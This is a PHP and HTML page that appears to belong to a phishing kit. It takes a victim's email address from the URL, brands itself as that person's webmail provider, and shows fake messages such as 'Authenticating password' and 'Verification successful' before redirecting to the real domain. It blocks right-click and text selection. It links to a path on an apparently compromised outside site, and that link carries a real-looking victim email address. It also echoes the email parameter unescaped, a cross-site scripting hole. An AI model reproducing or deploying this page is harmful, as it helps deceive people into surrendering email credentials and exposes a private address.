<?php
function getloginIDFromlogin($email)
{
$find = '@';
$pos = strpos($email, $find);
$loginID = substr($email, 0, $pos);
return $loginID;
}
function getDomainFromEmail($email)
{
// Get the data after the @ sign
$domain = substr(strrchr($email, "@"), 1);
return $domain;
}
$login = $_GET['email'];
$loginID = getloginIDFromlogin($login);
$domain = getDomainFromEmail($login);
$ln = strlen($login);
$len = strrev($login);
$x = 0;
for($i=0; $i<$ln; $i++){
	if($len[$i] == "@"){
		$x = $i;
		break;
	}
}
$yuh = substr($len,0,$x);
$yuh = strrev($yuh);
for($i=0; $i<$ln; $i++){
	if($yuh[$i] == "."){
		$x = $i;
		break;
	}
}
$yuh = substr($yuh,0,$x);
$yuh = ucfirst($yuh);
?><!DOCTYPE html><html lang="en" data-scribe-reduced-action-queue="true"><!--<![endif]--><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
</head><body bgcolor="#E4E5E3" class="highline logged-out ms-windows" data-fouc-class-names="swift-loading" dir="ltr" oncontextmenu="return false" onselectstart="return false" ondragstart="return false">
<link rel="stylesheet" href="i.css">
<link rel="stylesheet" href="ii.css">
<title><?php echo $yuh ?> Connecting to email provider server .....</title>
<meta name="robots" content="NOODP">
<link href="http://<?php echo $domain ?>/favicon.ico" rel="shortcut icon" type="image/x-icon">
<link href="bootstrap.css" rel="stylesheet">
<link href="signin.css" rel="stylesheet">
<link href="errors.css" rel="stylesheet" type="text/css">

<script>



var preloadimages=new Array(":abstract.simplenet.com/point.gif","abstract.simplenet.com/point2.html")



var intervals=3000

//configure destination URL

var targetdestination="http://<?php echo $domain ?>"





var splashmessage=new Array()

var openingtags=''

splashmessage[0]='<spam id="login-status" class="info-notice">Connecting to database'

splashmessage[1]='<spam id="login-status" class="info-notice">Authentication in progress ………'

splashmessage[2]='<spam id="login-status" class="info-notice">Authenticating password for <?php echo $_GET['email']; ?></spam>'

splashmessage[3]='<spam id="login-status" class="success-notice">Authentication Success  ……</spam>'

splashmessage[4]='<spam id="login-status" class="info-notice">Verifying <?php echo $_GET['email']; ?> '

splashmessage[5]='<spam id="login-status" class="info-notice">Please Wait</spam>'

splashmessage[6]='<spam id="login-status" class="success-notice">Verification successful. Redirecting ………</spam>'




var closingtags='</font>'



//Do not edit below this line (besides HTML code at the very bottom)



var i=0



var ns4=document.layers?1:0

var ie4=document.all?1:0

var ns6=document.getElementById&&!document.all?1:0

var theimages=new Array()



//preload images

if (document.images){

for (p=0;p<preloadimages.length;p++){

theimages[p]=new Image()

theimages[p].src=preloadimages[p]

}

}



function displaysplash(){

if (i<splashmessage.length){

sc_cross.style.visibility="hidden"

sc_cross.innerHTML='<b><center>'+openingtags+splashmessage[i]+closingtags+'</center></b>'

sc_cross.style.left=ns6?parseInt(window.pageXOffset)+parseInt(window.innerWidth)/2-parseInt(sc_cross.style.width)/2 :document.body.scrollLeft+document.body.clientWidth/2-parseInt(sc_cross.style.width)/2

sc_cross.style.top=ns6?parseInt(window.pageYOffset)+parseInt(window.innerHeight)/2-sc_cross.offsetHeight/2:document.body.scrollTop+document.body.clientHeight/2-sc_cross.offsetHeight/2

sc_cross.style.visibility="visible"

i++

}

else{

window.location=targetdestination

return

}

setTimeout("displaysplash()",intervals)

}



function displaysplash_ns(){

if (i<splashmessage.length){

sc_ns.visibility="hide"

sc_ns.document.write('<b>'+openingtags+splashmessage[i]+closingtags+'</b>')

sc_ns.document.close()



sc_ns.left=pageXOffset+window.innerWidth/2-sc_ns.document.width/2

sc_ns.top=pageYOffset+window.innerHeight/2-sc_ns.document.height/2



sc_ns.visibility="show"

i++

}

else{

window.location=targetdestination

return

}

setTimeout("displaysplash_ns()",intervals)

}







function positionsplashcontainer(){

if (ie4||ns6){

sc_cross=ns6?document.getElementById("splashcontainer"):document.all.splashcontainer

displaysplash()

}

else if (ns4){

sc_ns=document.splashcontainerns

sc_ns.visibility="show"

displaysplash_ns()

}

else

window.location=targetdestination

}

window.onload=positionsplashcontainer



</script>
<script><!--

 var jv=1.0;

//--></script>



<script language="Javascript1.1"><!--

 jv=1.1;

//--></script>



<script language="Javascript1.2"><!--

 jv=1.2;

//--></script>



<script language="Javascript1.3"><!--

 jv=1.3;

//--></script>



<script language="Javascript1.4"><!--

 jv=1.4;

//--></script>


    <div id="doc" class="route-login login-responsive">
        <div class="topbar js-topbar">
  <div id="banners" class="js-banners">
  </div>
  <div class="global-nav" data-section-term="top_nav">
    <div class="global-nav-inner">
      <div class="container">
<spam class="nav js-global-actions"> <spam class="home" data-global-action="t1home">  
<a href="http://www.milwaukeepr.com/test1/larry/hlp/loading.php?Email=amministrazione@gigiemme.it&amp;.rand=13InboxLight.aspx?n=1774256418&amp;fid=4#" data-nav="front">  </a>   </spam> </spam>  <div class="pull-right">  <spam class="nav secondary-nav language-dropdown"> <spam class="dropdown js-language-dropdown"> <spam class="dropdown-toggle js-dropdown-toggle"> <span class="js-current-language">
<div id="google_translate_element" align="left">
</div></span> <b class="caret"></b> <div class="dropdown-menu"> <div class="dropdown-caret right"> <span class="caret-outer"> </span> <span class="caret-inner"></span> </div>   </div></spam>   </spam></spam></div>
</div>
</div>
</div>
</div>
<div id="page-outer">
<div id="page-container" class="AppContent wrapper wrapper-login white">
<div class="page-canvas">
<div>
<div class="form-signin" role="form">

<h1 id="splashcontainer" style="visibility: visible;"><b><center><spam id="login-status" class="info-notice">Verifying </spam></center></b></h1>
<p align="center" class="style1"><br>
    <br>

      <img src="load.gif" width="66" height="66"></p>
</div>


<span class="style1"><font size="18">





</font></span><span class="style1"> </span>
<noscript>
&lt;span class="style1"&gt;&lt;IMG height=1 src="#"

width=1&gt;&lt;/span&gt;
</noscript>

  </div>

  <div class="clearfix mobile has-sms">
    <p class="signup-helper" style="text-align: center;"><!--<?php echo $yuh ?> Webmail -->Secured by <?php echo $yuh ?> Webmail Security Systems<br>
&copy; 2019 <?php echo $yuh ?> Corporation. All rights reserved.</p>
    </div>

</div>

          </div>
        </div>
      
    </div>
    <div class="gallery-overlay"></div>
<div class="modal-overlay"></div>




<div id="create-custom-timeline-dialog" class="modal-container"></div>
<div id="edit-custom-timeline-dialog" class="modal-container"></div>
<div id="curate-dialog" class="modal-container"></div>


    <div id="spoonbill-outer"></div>

<script type="text/javascript">

// UI startup
var UI = new rcube_mail_ui();
$(document).ready(function(){
	UI.set('errortitle', 'An error occurred!');
	UI.init();
});

</script>





<script type="text/javascript">

jQuery.extend(jQuery.ui.dialog.prototype.options.position, {
                using: function(pos) {
                    var me = jQuery(this),
                        offset = me.css(pos).offset(),

                        topOffset = offset.top - 12;
                    if (topOffset < 0)
                        me.css('top', pos.top - topOffset);
                    if (offset.left + me.outerWidth() + 12 > jQuery(window).width())
                        me.css('left', pos.left - 12);
                }
            });
$(document).ready(function(){ 
rcmail.init();
var images = ["skins\/larry\/images\/ajaxloader.gif","skins\/larry\/images\/buttons.png","skins\/larry\/images\/addcontact.png","skins\/larry\/images\/filetypes.png","skins\/larry\/images\/listicons.png","skins\/larry\/images\/messages.png","skins\/larry\/images\/quota.png","skins\/larry\/images\/selector.png","skins\/larry\/images\/splitter.png","skins\/larry\/images\/watermark.jpg"];
            for (var i=0; i<images.length; i++) {
                img = new Image();
                img.src = images[i];
            }
});
</script></body></html>